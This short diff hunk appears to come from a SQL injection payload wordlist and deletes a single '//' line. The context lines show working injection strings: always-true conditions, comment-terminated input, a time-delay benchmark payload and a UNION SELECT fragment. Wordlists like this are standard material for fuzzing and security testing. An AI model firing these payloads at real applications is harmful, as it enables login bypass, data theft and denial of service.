@@ -60,7 +60,6 @@ x' AND email IS NULL; --
 &
 admin' or '
  or 'unusual' = 'unusual'
-//
 truncate
 1) or benchmark(10000000,MD5(1))#
 \x27UNION SELECT
